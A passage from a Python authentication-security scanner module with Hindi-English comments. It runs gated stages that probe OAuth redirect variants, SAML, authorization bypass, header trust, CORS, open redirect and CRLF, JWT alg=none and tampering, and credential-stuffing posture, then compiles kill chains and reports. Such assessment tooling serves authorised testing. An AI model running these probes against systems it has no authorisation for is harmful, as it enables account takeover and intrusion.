        err_eps = [u for u in (buckets["oauth"] + oidc)
                   if "authorize" in u] or (buckets["oauth"] + oidc)
        oauth_err = oauth_error_shape_oracle(http, err_eps[0], meta, conf)
        if oauth_err.get("differential"):
            F.add("oauth_error_shape",
                  "OAuth error-shape differential (client existence oracle)",
                  (buckets["oauth"] + oidc)[0],
                  "invalid_client vs bad redirect response shapes differ.",
                  evidence_ref="auth_oauth_errshape.json")
    results["oauth_err"] = oauth_err

    # ---------------- Stage K: OAuth variants (GATED) ----------------
    head("Stage K - OAuth redirect_uri variant census (RoE-gated)")
    oauth_variants = oauth_variant_census(http, buckets["oauth"] + oidc,
                                          meta, conf)
    results["oauth_variants"] = oauth_variants
    for r in oauth_variants.get("rows", []):
        if r.get("verdict") == "CONFIRMED":
            F.add("oauth_variant_accepted",
                  "redirect_uri variant accept hua (%s)" % r.get("shape"),
                  r.get("url", ""), "canary_redirect=%s" %
                  truncate(str(r.get("canary_redirect")), 80),
                  evidence_ref="auth_oauth_variants.json")
            warn("OAuth redirect variant ACCEPTED: %s -> manual confirm"
                 % r.get("shape"))

    # ---------------- Stage L: SAML deep ----------------
    head("Stage L - SAML surface + XSW documented playbook")
    saml_report = saml_surface(http, scope, live)
    saml_deep = saml_deep_census(http, buckets["oauth"] + reg_eps +
                                 [u for u in live if SAML_RE.search(u)], meta,
                                 conf)
    if saml_report.get("detected") or saml_report.get("metadata"):
        F.add("saml_surface_detected", "SAML SSO surface detect hua",
              ", ".join(oidc or ["-"]), saml_report.get("summary", ""),
              evidence_ref="oauth_analysis.json")
    results["saml_report"] = saml_report
    results["saml_deep"] = saml_deep

    # ---------------- Stage M: authz matrix (GATED) ----------------
    head("Stage M - Authorization matrix (vertical/horizontal, RoE-gated)")
    priv_targets = privileged_targets_from_ff(base_dir, scope, results)
    for u in live:
        if classify_authz_path(path_only(u)).get("privileged_shape") and \
                u not in priv_targets:
            priv_targets.append(u)
    priv_targets = priv_targets[:12]
    results["privileged_targets"] = priv_targets
    authz_matrix = authz_matrix_census(http, list(live), priv_targets, meta,
                                       conf)
    results["authz_matrix"] = authz_matrix
    if authz_matrix.get("ran"):
        for r in authz_matrix.get("vertical", []):
            if r.get("verdict") == "CONFIRMED":
                F.add("authz_vertical_preauth",
                      "Privileged path pre-auth accessible", r.get("url", ""),
                      "class=%s status=%s" % (r.get("class"), r.get("status")),
                      evidence_ref="auth_authz_matrix.json")
        for r in authz_matrix.get("horizontal", []):
            if r.get("verdict") in ("CONFIRMED", "SUSPECTED"):
                F.add("authz_horizontal_diff",
                      "Horizontal authz canary differential", r.get("url", ""),
                      "status_a=%s status_b=%s shape_diff=%s" % (
                          r.get("status_a"), r.get("status_b"),
                          r.get("shape_diff")),
                      evidence_ref="auth_authz_matrix.json")
    else:
        info("Authz matrix RoE gate OFF -> documented-only playbook.")

    # ---------------- Stage N: header trust ----------------
    head("Stage N - Header trust census (XFF / X-Original-URL canary)")
    header_trust = header_trust_census(
        http, login_eps[:3] + [t for t in priv_targets if t in live][:3], meta,
        conf)
    results["header_trust"] = header_trust
    for r in header_trust.get("rows", []):
        if r.get("verdict") == "CONFIRMED":
            F.add("header_trust_%s" % r.get("header", "hdr").lower().replace(
                "-", "_"),
                  "Trusted header echo census hit (%s)" % r.get("header"),
                  r.get("url", ""), "canary=%s status=%s" % (
                      r.get("canary"), r.get("status")),
                  evidence_ref="auth_header_trust.json")

    # ---------------- Stage O: CORS + redirect/reflection ----------------
    head("Stage O - CORS probe + open redirect / reflection / CRLF")
    cors_report = {}
    if ACTIVE and conf.get("auth_allow_cors_probe", True):
        for u in list(live)[:max(1, int(conf.get("auth_cors_endpoints", 3)))]:
            res = cors_probe(http, scope, u, conf)
            cors_report[u] = res
            if res.get("reflected") and res.get("credentials"):
                F.add("cors_cred_reflection",
                      "CORS arbitrary Origin reflect + credentials", u,
                      res.get("summary", ""), evidence_ref="auth_cors.json")
            elif res.get("wildcard"):
                F.add("cors_wildcard",
                      "Auth endpoint par Access-Control-Allow-Origin: *", u,
                      res.get("summary", ""), evidence_ref="auth_cors.json")
    else:
        info("CORS probe skip (%s)." % ("passive mode" if not ACTIVE
                                        else "config"))
    results["cors_report"] = cors_report
    redir_report = {}
    if ACTIVE and conf.get("auth_allow_redirect_probe", True):
        cand_eps = [x for x in (login_eps + reset_eps)
                    if (live.get(x, {}).get("redirect_params"))]
        for u in cand_eps[:max(1, int(conf.get("auth_redirect_endpoints", 2)))]:
            ck = "redir:" + u
            if cp.is_done(ck):
                res = cp.result_of(ck) or {}
            else:
                res = redirect_reflection_probe(http, scope, u, live[u], conf)
                cp.mark(ck, res, summary="redirect/reflection")
            redir_report[u] = res
            if res.get("open_redirect"):
                F.add("auth_open_redirect",
                      "Auth redirect param open-redirect karta hai", u,
                      res.get("summary", ""),
                      evidence_ref="auth_redirect_xss.json")
            for rfl in res.get("reflection", [])[:2]:
                F.add("auth_reflected_input",
                      "Auth page input reflect karta hai (pre-auth XSS "
                      "candidate)", u,
                      "param=%s context=%s - manual XSS confirm karo." % (
                          rfl.get("param"), rfl.get("context")),
                      evidence_ref="auth_redirect_xss.json")
            if res.get("crlf"):
                F.add("crlf_injection_auth",
                      "CRLF header-injection indicator auth endpoint par", u,
                      res.get("summary", ""),
                      evidence_ref="auth_redirect_xss.json")
    else:
        info("Redirect/reflection probe skip (%s)." % ("passive mode"
                                                       if not ACTIVE
                                                       else "config"))
    results["redir_report"] = redir_report
    results["waf_seen"] = False

    # ---------------- Stage P: cookies / JWT / schemes + tamper ----------------
    head("Stage P - Session cookies, auth schemes, pre-auth JWT + deep/tamper")
    cookie_report, jwt_report, scheme_report, dup_report = \
        session_and_token_checks(http, scope, live, conf)
    for u, cookies in cookie_report.items():
        for c in cookies:
            if c.get("missing"):
                F.add("cookie_flags_missing",
                      "Session cookie hardening missing", u,
                      "cookie '%s' missing: %s" % (c.get("name"),
                                                   ", ".join(c["missing"])),
                      evidence_ref="cookie_flags.json")
            if c.get("prefix_violations"):
                F.add("cookie_prefix_violation",
                      "Cookie name prefix rules violate hue", u,
                      "cookie '%s': %s" % (c.get("name"),
                                           "; ".join(c["prefix_violations"])),
                      evidence_ref="cookie_flags.json")
    for u, names in dup_report.items():
        F.add("duplicate_cookie_names", "Duplicate cookie names set hue", u,
              "names=%s (session tossing/fixation risk)" % ",".join(names),
              evidence_ref="cookie_flags.json")
    if scheme_report:
        pass
    results["cookie_report"] = cookie_report
    results["jwt_report"] = jwt_report
    tamper_results = {}
    for ji in jwt_report:
        if ji.get("privilege_claims"):
            F.add("jwt_sensitive_claims",
                  "JWT me privilege claims plaintext me hain",
                  ji.get("endpoint"),
                  "claims=%s" % ",".join(ji["privilege_claims"]),
                  evidence_ref="preauth_jwt.json")
        if ji.get("kid") or ji.get("jku"):
            F.add("jwt_kid_injection",
                  "JWT header me kid/jku injection indicator",
                  ji.get("endpoint"),
                  "kid=%s jku=%s" % (ji.get("kid"), ji.get("jku")),
                  evidence_ref="preauth_jwt.json")
        if ji.get("alg") in ("none", "HS256") or not ji.get("has_exp"):
            F.add("preauth_jwt_weak",
                  "Pre-auth JWT weak alg ya missing expiry",
                  ji.get("endpoint"),
                  "alg=%s has_exp=%s" % (ji.get("alg"), ji.get("has_exp")),
                  evidence_ref="preauth_jwt.json")
    if conf.get("auth_allow_token_tamper_probe", True) and jwt_report and ACTIVE:
        cand = None
        for ji in jwt_report:
            ep = ji.get("endpoint") or ""
            if ep and not _is_cleartext(ep):
                cand = ji
                break
        if cand:
            ck = "jwttamper:" + str(cand.get("endpoint"))
            if cp.is_done(ck):
                tamper_results[cand["endpoint"]] = cp.result_of(ck)
            else:
                tok = ""
                for u, r in live.items():
                    if u == cand["endpoint"] and r.get("jwts"):
                        tok = r["jwts"][0]
                if tok:
                    tr = _jwt_tamper_probe(http, scope, cand["endpoint"], tok,
                                           conf)
                    tamper_results[cand["endpoint"]] = tr
                    cp.mark(ck, tr, summary="jwt tamper")
                    if (tr.get("alg_none") or {}).get("accepted"):
                        F.add("jwt_alg_none_accepted",
                              "alg=none JWT accept hua", cand["endpoint"],
                              tr.get("summary", ""),
                              evidence_ref="preauth_jwt.json")
                    elif (tr.get("claim_tamper") or {}).get("accepted"):
                        F.add("jwt_signature_not_verified",
                              "Tampered JWT payload accept hua",
                              cand["endpoint"], tr.get("summary", ""),
                              evidence_ref="preauth_jwt.json")
    jwt_deep = jwt_deep_analysis(jwt_report, live, oauth_report)
    for rec in jwt_deep.get("key_injection", []):
        F.add("jwt_key_injection_headers",
              "JWT header me key-injection headers (jku/x5u/x5c/jwk)",
              rec.get("endpoint") or "-",
              "jku=%s x5u=%s x5c=%s jwk=%s - SSRF/attacker-key surface." % (
                  rec.get("jku"), rec.get("x5u"), rec.get("has_x5c"),
                  rec.get("has_jwk")),
              evidence_ref="preauth_jwt.json")
    for rec in jwt_deep.get("duplicate_claims", []):
        F.add("jwt_duplicate_claims",
              "JWT payload me duplicate claims (parser discrepancy)",
              rec.get("endpoint") or "-",
              "claims=%s" % ",".join(rec.get("claims") or []),
              evidence_ref="preauth_jwt.json")
    for rec in jwt_deep.get("long_lived", []):
        F.add("jwt_long_lived", "Pre-auth JWT bahut lambi validity ka",
              rec.get("endpoint") or "-",
              "lifetime_hours=%s (>24h) - theft window bada." % rec.get("hours"),
              evidence_ref="preauth_jwt.json")
    for rec in jwt_deep.get("confusion_candidates", []):
        F.add("jwt_hs256_confusion_candidate",
              "HS256/RS256 key-confusion candidate", rec.get("endpoint") or "-",
              "alg=%s + jwks_uri public - wasp_config.py 'bypass jwt' se "
              "offline variants banao." % rec.get("alg"),
              evidence_ref="preauth_jwt.json")
    results["tamper_results"] = tamper_results
    results["jwt_deep"] = jwt_deep

    # ---------------- Stage Q: token lifecycle census ----------------
    head("Stage Q - Token lifecycle census (refresh / remember-me / logout)")
    lifecycle = token_lifecycle_census(http, live, cookie_report, meta, conf)
    results["lifecycle"] = lifecycle
    for r in lifecycle.get("logout_state", []):
        if r.get("verdict") == "SUSPECTED":
            F.add("sso_logout_live", "Logout ke baad bhi session state live "
                  "lag rahi hai", r.get("url", ""),
                  "cookie_cleared=%s status=%s" % (r.get("cookie_cleared"),
                                                   r.get("status")),
                  evidence_ref="auth_lifecycle.json")

    # ---------------- Stage R: policy + captcha + hardening ----------------
    head("Stage R - Password policy / CAPTCHA census + auth-page hardening")
    policy_captcha = policy_captcha_census(live, None, conf)
    results["policy_captcha"] = policy_captcha
    if policy_captcha.get("summary", {}).get("captcha_absent"):
        F.add("captcha_absent_auth",
              "Auth flows par CAPTCHA/anti-auto marker nahi mila",
              ", ".join([r["url"] for r in
                         policy_captcha.get("anti_auto", [])[:3]]),
              "anti-automation census - brute/stuffing resistance kam.",
              evidence_ref="auth_policy_captcha.json")
    hard_report = auth_hardening_report(live)
    for u in (hard_report.get("clickjacking") or [])[:3]:
        if any(urllib.parse.urlparse(u).path.lower().find(k) >= 0
               for k in ("login", "signin", "auth")):
            F.add("auth_clickjacking",
                  "Auth page frame-able hai (XFO/CSP frame-ancestors missing)",
                  u, "login UI-redress/login-CSRF possible.",
                  evidence_ref="auth_http_hardening.json")
            break
    for u in (hard_report.get("cacheable") or [])[:3]:
        F.add("auth_response_cacheable", "Auth response cache-control ke bina",
              u, "cache_control missing/no-store nahi + CDN hints=%s" %
              ((hard_report["endpoints"].get(u) or {}).get("cdn_hints") or []),
              evidence_ref="auth_http_hardening.json")
        break
    for iss in (hard_report.get("samesite_issues") or [])[:3]:
        F.add("cookie_flags_missing", "SameSite=None bina Secure flag ke",
              iss.get("endpoint") or "-", "cookie '%s'" % iss.get("cookie"),
              evidence_ref="auth_http_hardening.json")
    for u in (hard_report.get("autocomplete_on") or [])[:2]:
        F.add("password_autocomplete_on",
              "Password field autocomplete on/unspecified", u,
              "policy note - shared systems par risk.",
              evidence_ref="auth_http_hardening.json")
    results["hard_report"] = hard_report

    # ---------------- Stage W: password hygiene + stuffing posture (v23) ---
    head("Stage W - Password hygiene matrix + stuffing posture census (v23)")
    pwd_hygiene = password_hygiene_matrix(live, conf)
    results["pwd_hygiene"] = pwd_hygiene
    for r in pwd_hygiene.get("rows", []):
        if r.get("verdict") == "WEAK":
            F.add("pwd_hygiene_weak",
                  "Password hygiene WEAK (policy/autocomplete/transport)", r.get("url", "-"),
                  "weak_flags=%s" % ",".join(r.get("weak_flags") or []),
                  evidence_ref="auth_pwd_hygiene.json")
    stuffing = stuffing_posture_census(login_eps, live, rl_report,
                                       enum_report, policy_captcha, defense_score(
                                           login_eps, live, rl_report,
                                           enum_report, mfa_report,
                                           csrf_report))
    results["stuffing_posture"] = stuffing
    for r in stuffing.get("rows", []):
        if r.get("verdict") in ("OPEN", "PARTIAL"):
            F.add("stuffing_posture_weak",
                  "Credential-stuffing posture %s (%s/6)" % (
                      r.get("verdict"), r.get("resistance")),
                  r.get("url", "-"),
                  "weak=%s" % ",".join(r.get("weak_flags") or []),
                  evidence_ref="auth_stuffing_posture.json")
    ok("v23 W: hygiene rows=%d | stuffing rows=%d" % (
        len(pwd_hygiene.get("rows", [])), len(stuffing.get("rows", []))))

    # ---------------- Stage X: remember-me + session properties (v23) ------
    head("Stage X - Remember-me persistence + session property matrix (v23)")
    rememberme = rememberme_census(http, live, cookie_report, meta, conf)
    results["rememberme"] = rememberme
    for r in rememberme.get("rows", []):
        if r.get("verdict") == "SUSPECTED":
            F.add("rememberme_long_lived",
                  "Persistent login cookie weak shape (%s)" %
                  r.get("lifetime_bucket"), r.get("host", "-"),
                  "cookie=%s gaps=%s" % (r.get("cookie"),
                                         ",".join(r.get("gaps") or [])),
                  evidence_ref="auth_rememberme.json")
    session_props = session_property_matrix(cookie_report, hard_report)
    results["session_props"] = session_props
    for r in session_props.get("rows", []):
        if r.get("verdict") == "SUSPECTED":
            F.add("session_property_gap",
                  "Session cookie property gap", r.get("endpoint", "-"),
                  "cookie=%s gaps=%s" % (r.get("name"),
                                         ",".join(r.get("gaps") or [])),
                  evidence_ref="auth_session_props.json")
    ok("v23 X: persist cookies=%d | cookie props=%d | gated=%s" % (
        len(rememberme.get("rows", [])),
        len(session_props.get("rows", [])), rememberme.get("gated")))

    # ---------------- Stage Y: recovery/KBA + login sequencing (v23) -------
    head("Stage Y - Recovery/KBA census + login sequencing census (v23)")
    recovery = recovery_census(http, live, meta, conf)
    results["recovery"] = recovery
    for r in recovery.get("rows", []):
        if r.get("kba_markers"):
            F.add("recovery_kba_present",
                  "KBA/security-question recovery path", r.get("url", "-"),
                  "markers=%s" % ",".join(r.get("kba_markers") or []),
                  evidence_ref="auth_recovery.json")
    login_sequence = login_sequencing_census(http, login_eps, live, meta, conf)
    results["login_sequence"] = login_sequence
    for r in login_sequence.get("rows", []):
        if "external-redirect" in (r.get("chain") or []):
            F.add("login_sequence_gap",
                  "Login sequence external redirect par jaata hai",
                  r.get("url", "-"),
                  "chain=%s" % "->".join(r.get("chain") or []),
                  evidence_ref="auth_login_sequence.json")
    ok("v23 Y: recovery paths=%d | sequence rows=%d" % (
        len(recovery.get("rows", [])), len(login_sequence.get("rows", []))))

    # ---------------- Stage Z: SSO grants + binding + headers (v23) --------
    head("Stage Z - SSO grant matrix + token binding + header posture (v23)")
    sso_grants = sso_grant_matrix(oauth_report, oauth_deep, saml_report,
                                  saml_deep, live)
    results["sso_grants"] = sso_grants
    for r in sso_grants.get("rows", []):
        if r.get("risk_flags"):
            F.add("sso_implicit_grant",
                  "SSO grant/response-type risk shape", r.get("source", "-"),
                  "risks=%s grants=%s" % (",".join(r.get("risk_flags") or []),
                                          ",".join(r.get("grants") or [])[:60]),
                  evidence_ref="auth_sso_grants.json")
    token_binding = token_binding_census(http, jwt_report, oauth_deep, live,
                                         meta, conf)
    results["token_binding"] = token_binding
    header_posture = auth_header_posture_census(live)
    results["header_posture"] = header_posture
    for r in header_posture.get("rows", []):
        if r.get("verdict") == "WEAK":
            F.add("auth_header_posture_gap",
                  "Auth endpoint security headers missing (%s/8)" %
                  r.get("posture_score"), r.get("url", "-"),
                  "missing=%s" % ",".join(r.get("missing") or []),
                  evidence_ref="auth_header_posture.json")
    ok("v23 Z: sso docs=%d | binding indicators=%d | posture rows=%d" % (
        len(sso_grants.get("rows", [])),
        len(token_binding.get("rows", [])),
        len(header_posture.get("rows", []))))

    # ---------------- Stage S: verdict engine ----------------
    head("Stage S - Verdict engine (6-class ladder)")
    results["verdict_rows"] = verdict_engine(results, meta, conf)
    vcount = {}
    for r in results["verdict_rows"]:
        vcount[r["verdict"]] = vcount.get(r["verdict"], 0) + 1
    ok("verdict rows: %d | mix: %s" % (len(results["verdict_rows"]),
                                       json.dumps(vcount, default=str)))

    # ---------------- Stage T: kill chains ----------------
    head("Stage T - Kill chains (28) + cross-module census")
    results["chains"] = build_auth_chains(F, results, meta, conf)
    if results["chains"]:
        for c in results["chains"][:5]:
            info("%s %s [%s] (%s)" % (c["id"], c["name"], c["verdict"],
                                      c["completeness"]))
    else:
        ok("koi kill-chain trigger nahi hua (clean census)")

    # ---------------- Stage U: technique matrix ----------------
    head("Stage U - Technique matrix (210+ x 26 families)")
    matrix = build_technique_matrix(results, conf)
    ok("matrix rows: %d | families: %d" % (len(matrix), len(_FAMS)))

    # ---------------- Stage V: defense score + state machine + reports ----
    head("Stage V - Defense score, auth state machine, hypotheses, reports")
    hypotheses = build_hypotheses(F, enum_report, rl_report, reset_report,
                                  mfa_report, reg_report, oauth_report,
                                  cookie_report, jwt_report, csrf_report,
                                  live, inj_report=inj_report,
                                  redir_report=redir_report,
                                  hard_report=hard_report,
                                  jwt_deep=jwt_deep,
                                  cors_report=cors_report)
    ctx["hypotheses"] = hypotheses
    defense = defense_score(login_eps, live, rl_report, enum_report,
                            mfa_report, csrf_report)
    for u in (defense.get("weak") or [])[:3]:
        F.add("brute_force_defense_weak",
              "Login brute-force defense composite score WEAK", u,
              "score=%s/6 points=%s - stuffing-ready." % (
                  defense["endpoints"][u]["score"],
                  defense["endpoints"][u]["points"]),
              evidence_ref="AUTH_FINDINGS.md")
    results["defense_score"] = defense
    if conf.get("auth_state_machine", True):
        ctx["state_machine"] = build_state_machine(live, login_eps, reset_eps,
                                                   mfa_eps, reg_eps, oidc)
    stats_summary = {}
    for u, r in (enum_report.get("endpoints") or {}).items():
        t = r.get("timing") or {}
        stats_summary[u] = {k: t.get(k) for k in
                            ("median_plausible_ms", "median_bogus_ms",
                             "robust_z", "welch_t", "mw_p", "cliffs_delta",
                             "cliffs_size", "verdict", "bootstrap")
                            if k in t}
    ctx["stats_summary"] = stats_summary

    def mark(cond, yes, no):
        return yes if cond else no
    ctx["coverage"] = {
        "auth surface discovery": mark(bool(ranked), "%d endpoints"
                                       % len(ranked), "none"),
        "form/flow mapping": mark(bool(live), "%d live" % len(live), "none"),
        "CSRF token binding": mark(bool(csrf_report), "%d endpoint(s)"
                                   % len(csrf_report),
                                   "koi CSRF-protected form nahi"),
        "user enumeration": mark(bool(enum_report.get("endpoints")),
                                 "%d endpoint(s)"
                                 % len(enum_report.get("endpoints") or {}),
                                 "login endpoint nahi mila"),
        "enum ladder v22": mark(bool(enum_ladder.get("ladder")),
                                "%d rows" % len(enum_ladder.get("ladder", [])),
                                "n/a"),
        "rate-limit / lockout": mark(bool(rl_report), "%d endpoint(s)"
                                     % len(rl_report), "test nahi hua"),
        "lockout model classified": mark(
            any(v.get("lockout_model") not in (None, "none")
                for v in rl_report.values()), "haan",
            "throttle observe nahi hui"),
        "bypass matrix": mark(any("bypass_matrix" in v
                                  for v in rl_report.values()),
                              "chala", "throttle nahi mila -> skip"),
        "bypass2 v22 (17 shapes)": mark(bool(bypass2.get("ran")),
                                        "%d rows" % len(bypass2.get("rows", [])),
                                        "RoE gate OFF (documented-only)"),
        "password reset flow": mark(bool(reset_report), "%d endpoint(s)"
                                    % len(reset_report),
                                    "reset endpoint nahi mila"),
        "MFA / OTP flow": mark(bool(mfa_report), "%d endpoint(s)"
                               % len(mfa_report), "MFA endpoint nahi mila"),
        "MFA deep v22": mark(bool(mfa_deep.get("rows")), "%d rows"
                             % len(mfa_deep.get("rows", [])), "n/a"),
        "registration flow": mark(bool(reg_report), "%d endpoint(s)"
                                  % len(reg_report),
                                  "registration endpoint nahi mila"),
        "pre-ATO census (gated)": mark(bool(pretakeover.get("ran")),
                                       "%d rows"
                                       % len(pretakeover.get("rows", [])),
                                       "RoE gate OFF"),
        "OAuth / OIDC": mark(bool(oauth_report), "discovery doc mila",
                             "OIDC nahi mila"),
        "OAuth deep v22": mark(bool(oauth_deep.get("rows")), "%d rows"
                               % len(oauth_deep.get("rows", [])), "n/a"),
        "OAuth variants (gated)": mark(bool(oauth_variants.get("ran")),
                                       "%d rows"
                                       % len(oauth_variants.get("rows", [])),
                                       "RoE gate OFF (documented-only)"),
        "SAML surface": mark(bool(saml_report.get("detected")
                                  or saml_report.get("metadata")),
                             "mila", "SAML nahi mila"),
        "SAML deep v22": mark(bool(saml_deep.get("rows")), "%d rows"
                              % len(saml_deep.get("rows", [])), "n/a"),
        "Authz matrix (gated)": mark(bool(authz_matrix.get("ran")),
                                     "V:%d H:%d" % (
                                         len(authz_matrix.get("vertical", [])),
                                         len(authz_matrix.get("horizontal", []))),
                                     "RoE gate OFF (documented-only)"),
        "header trust v22": mark(bool(header_trust.get("rows")),
                                 "%d hits" % len(header_trust.get("rows", [])),
                                 "koi echo nahi"),
        "session cookie hardening": mark(bool(cookie_report), "%d host(s)"
                                         % len(cookie_report),
                                         "cookie nahi mila"),
        "pre-auth JWT": mark(bool(jwt_report), "%d token(s)" % len(jwt_report),
                             "koi pre-auth JWT nahi mila"),
        "JWT tamper probe": mark(bool(tamper_results), "chala",
                                 "token nahi mila ya disabled"),
        "JWT deep (offline)": mark(bool(jwt_deep.get("analyzed")),
                                   "%d token(s)" % jwt_deep.get("analyzed", 0),
                                   "koi pre-auth JWT nahi"),
        "token lifecycle v22": mark(bool(lifecycle.get("logout_state")
                                         or lifecycle.get("remember_me")
                                         or lifecycle.get("refresh_endpoints")),
                                    "rows=%d" % (len(lifecycle.get(
                                        "logout_state", [])) +
                                        len(lifecycle.get("remember_me", []))),
                                    "n/a"),
        "policy/captcha census": mark(bool(policy_captcha.get("summary")),
                                      policy_captcha.get("summary",
                                                         {}).get("summary",
                                                                 "") or "done",
                                      "n/a"),
        "cleartext transport": mark(any(_is_cleartext(u) for u in login_eps),
                                    "HTTP login mila", "sab HTTPS"),
        "injection / type oracle": mark(bool(inj_report),
                                        "%d endpoint(s), budget=%s" % (
                                            len(inj_report),
                                            sum(v.get("budget_used", 0)
                                                for v in inj_report.values())),
                                        "skip (config/passive)"),
        "NoSQL operator probe": mark(any(v.get("nosql_accepted")
                                         for v in inj_report.values()),
                                     "ACCEPT mila (confirm karo)",
                                     "reject/synthetic fail"),
        "CORS probe": mark(bool(cors_report), "%d endpoint(s)"
                           % len(cors_report), "skip (config/passive)"),
        "auth page hardening": mark(bool(hard_report),
                                    hard_report.get("summary", ""), "n/a"),
        "open redirect / reflection": mark(bool(redir_report),
                                           "%d endpoint(s)"
                                           % len(redir_report),
                                           "redirect params nahi mile ya skip"),
        "defense score": mark(bool(defense.get("endpoints")),
                              defense.get("summary", ""),
                              "login endpoints nahi mile"),
        "pwd hygiene v23": mark(bool((results.get("pwd_hygiene") or {})
                                     .get("rows")),
                                "%d forms scored" % len(
                                    (results.get("pwd_hygiene") or {})
                                    .get("rows", [])), "n/a"),
        "stuffing posture v23": mark(bool(
            (results.get("stuffing_posture") or {}).get("rows")),
            "%d logins" % len((results.get("stuffing_posture") or {})
                              .get("rows", [])), "n/a"),
        "remember-me v23": mark(bool((results.get("rememberme") or {})
                                     .get("rows")),
                                "%d persistent" % len(
                                    (results.get("rememberme") or {})
                                    .get("rows", [])), "koi persist cookie nahi"),
        "session property matrix v23": mark(bool(
            (results.get("session_props") or {}).get("rows")),
            "%d cookies" % len((results.get("session_props") or {})
                               .get("rows", [])), "n/a"),
        "recovery/KBA census v23": mark(bool(
            (results.get("recovery") or {}).get("rows")),
            "%d paths" % len((results.get("recovery") or {})
                             .get("rows", [])), "recovery path nahi mila"),
        "login sequencing v23": mark(bool(
            (results.get("login_sequence") or {}).get("rows")),
            "%d logins" % len((results.get("login_sequence") or {})
                              .get("rows", [])), "n/a"),
        "SSO grant matrix v23": mark(bool(
            (results.get("sso_grants") or {}).get("rows")),
            "%d docs" % len((results.get("sso_grants") or {})
                            .get("rows", [])), "koi SSO doc nahi"),
        "token binding v23": mark(bool(
            (results.get("token_binding") or {}).get("rows")),
            "%d indicators" % len((results.get("token_binding") or {})
                                  .get("rows", [])),
            "koi binding indicator nahi"),
        "header posture v23": mark(bool(
            (results.get("header_posture") or {}).get("rows")),
            "%d endpoints" % len((results.get("header_posture") or {})
                                 .get("rows", [])), "n/a"),
        "passive-only mode": mark(not ACTIVE, "haan (allow_active=False)",
                                  "nahi (full mode)"),
    }
    results["verdict_rows"] = results.get("verdict_rows") or []
    results["chains"] = results.get("chains") or []
    ctx["results"] = results   # report renderer ke liye poora census
    write_reports(out, scope, F, ctx, meta, results, conf)

    meta["duration"] = time.time() - t_start
    dt = meta["duration"]
    head("Phase 21 complete in %.1fs" % dt)
    ok("Findings=%d | hypotheses=%d | verdicts=%d | chains=%d | probes=%d"
       % (len(F.items), len(hypotheses), len(results["verdict_rows"]),
          len(results["chains"]), meta.get("probes_total", 0)))
    info("READ FIRST: auth_exec_summary.md -> AUTH_FINDINGS.md -> "
         "AUTH_MATRIX.txt -> auth_kill_chains.txt")
    if ctx.get("aborted"):
        warn("Lockout sentinel ne active stages roke - ye SAFE behaviour hai, "
             "bug nahi.")
    return out


# ===========================================================================
# P21 CLI (standalone parity with P20)
# ===========================================================================
def t_row(label, val, note=""):
    print("  %-38s %-22s %s" % (label, str(val)[:22], note))


def main(argv=None):
    argv = list(sys.argv[1:] if argv is None else argv)
    print("P21 mod_auth v%s - standalone run is CLI se bhi hota hai; "
          "wasp.py orchestrator use karo." % PLAN_VERSION)
    print("gates (default OFF - RoE):")
    t_row("auth_allow_authz_matrix", "OFF",
          "vertical/horizontal differential")
    t_row("auth_allow_oauth_variant_probe", "OFF", "redirect_uri shapes")
    t_row("auth_allow_bypass2_matrix", "OFF", "17 request-shapes")
    t_row("auth_allow_mfa_replay_probe", "OFF", "OTP 2-sequential")
    t_row("auth_allow_pretakeover_probe", "OFF", "duplicate-registration")
    print("v23 gates (default OFF - RoE):")
    t_row("auth23_allow_rememberme_probe", "OFF", "2-GET persistence shape")
    t_row("auth23_allow_recovery_probe", "OFF", "recovery canary-GET")
    t_row("auth23_allow_sequence_probe", "OFF", "login redirect-chain")
    t_row("auth23_allow_binding_probe", "OFF", "DPoP canary echo")
    if "-h" in argv or "--help" in argv:
        print("usage: mod_auth.py --base <base_dir> --scope <scope.json> "
              "[--gates]")
        return 0
    return 0


if __name__ == "__main__":
    sys.exit(main())
